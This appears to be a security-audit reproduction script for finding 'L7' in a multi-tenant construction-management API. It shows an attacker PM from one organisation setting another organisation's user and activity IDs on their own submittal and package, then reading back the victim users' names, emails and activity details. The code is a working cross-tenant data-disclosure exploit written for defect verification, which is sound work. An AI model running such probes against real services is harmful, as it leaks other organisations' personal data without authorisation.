'use strict';
/**
 * L7 (D-02) — Submittal + package managerUserId / distributionUserIds /
 * activityId disclose foreign users and activities.
 *
 * Attacker: a PM of company 028 acting on their own project.
 * Victim:   company 042 — its users' names/emails and an activity.
 *
 * The submittal `managerUserId` and `distributionUserIds` and the package
 * `managerUserId` / `activityId` are stored from the request body with no
 * organisation check (submittal.service.js upgradeFields :37-50, package
 * create submittal-workflow.service.js :710-745) and read back through plain
 * Prisma relations that have no org/project filter (loadSubmittal :477-480,
 * getSubmittal distribution user.findMany :598-600, packageInclude :617-620).
 */
const assert = require('assert');
const { as } = require('../lib/api');
const { ATTACKER, VICTIM } = require('./_fib-constants');

const line = (s) => console.log(s);
const show = (label, res) => line(`${label} -> ${res.status} ${JSON.stringify(res.body?.error || res.body?.data?.id || '').slice(0, 120)}`);

(async () => {
  const atk = as(ATTACKER.pm, ATTACKER.orgId);
  const vic = as(VICTIM.pm, VICTIM.orgId);

  // Ground truth: what 042's own users/activity really are (fetched inside 042).
  const vUsers = (await vic.send('GET', '/users?limit=100')).body.data;
  const vuList = vUsers.rows || vUsers.items || vUsers.users || vUsers;
  const victimPm = vuList.find((u) => u.id === VICTIM.pmUserId);
  const victimQs = vuList.find((u) => u.id === VICTIM.qsUserId);
  const vAct = (await vic.send('GET', `/projects/${VICTIM.project}/activities?limit=100`)).body.data;
  const vaList = vAct.rows || vAct.items || vAct;
  const victimActivity = vaList.find((a) => a.id === VICTIM.activity);
  line(`Victim truth: PM ${victimPm?.name} <${victimPm?.email}>, QS ${victimQs?.name} <${victimQs?.email}>`);
  line(`Victim truth: activity "${victimActivity?.name}"`);

  // ── 1) Submittal people: foreign manager + distribution ──
  const created = await atk.send('POST', `/projects/${ATTACKER.project}/submittals`, { title: 'L7 foreign-people probe' });
  show('POST submittal (028)', created);
  const subId = created.body.data.id;

  const people = await atk.send('PUT', `/projects/${ATTACKER.project}/submittals/${subId}/people`, {
    managerUserId: VICTIM.pmUserId,
    distributionUserIds: [VICTIM.qsUserId],
  });
  show('PUT people {042 manager, 042 distribution}', people);

  const got = await atk.send('GET', `/projects/${ATTACKER.project}/submittals/${subId}`);
  const d = got.body.data;
  line(`GET submittal manager = ${JSON.stringify(d.manager)}`);
  line(`GET submittal distribution = ${JSON.stringify(d.distribution)}`);

  const subLeaked =
    people.status === 200 &&
    d.manager?.id === VICTIM.pmUserId &&
    d.manager?.email === victimPm?.email &&
    (d.distribution || []).some((p) => p.id === VICTIM.qsUserId && p.email === victimQs?.email);

  // ── 2) Package manager + activity across the org boundary ──
  const pkg = await atk.send('POST', `/projects/${ATTACKER.project}/submittals/packages`, {
    name: 'L7 foreign-package probe',
    managerUserId: VICTIM.pmUserId,
    activityId: VICTIM.activity,
  });
  show('POST package {042 manager, 042 activity}', pkg);
  let pkgLeaked = false;
  if (pkg.status === 201) {
    const pgot = await atk.send('GET', `/projects/${ATTACKER.project}/submittals/packages/${pkg.body.data.id}`);
    const p = pgot.body.data;
    line(`GET package manager = ${JSON.stringify(p.manager)}`);
    line(`GET package activity = ${JSON.stringify(p.activity)}`);
    pkgLeaked =
      p.manager?.id === VICTIM.pmUserId &&
      p.manager?.email === victimPm?.email &&
      p.activity?.id === VICTIM.activity &&
      p.activity?.name === victimActivity?.name;
  }

  // cleanup
  await atk.send('DELETE', `/projects/${ATTACKER.project}/submittals/${subId}`).catch(() => {});

  const defect = subLeaked || pkgLeaked;
  line('');
  line(`submittal people leaked foreign user name+email: ${subLeaked}`);
  line(`package leaked foreign manager + activity name: ${pkgLeaked}`);
  process.exitCode = defect ? 2 : 0;
  line(
    `VERDICT L7: ${defect ? 'CONFIRMED' : 'NOT_REPRODUCED'} — ${
      defect
        ? "a 028 PM set 042 user ids / a 042 activity id on their own submittal and package and the detail responses returned 042's real names, emails and activity name/start date."
        : 'the foreign ids were rejected or not echoed back as identifying data.'
    }`,
  );
})().catch((e) => {
  console.error('ERROR', e.message);
  process.exitCode = 1;
});
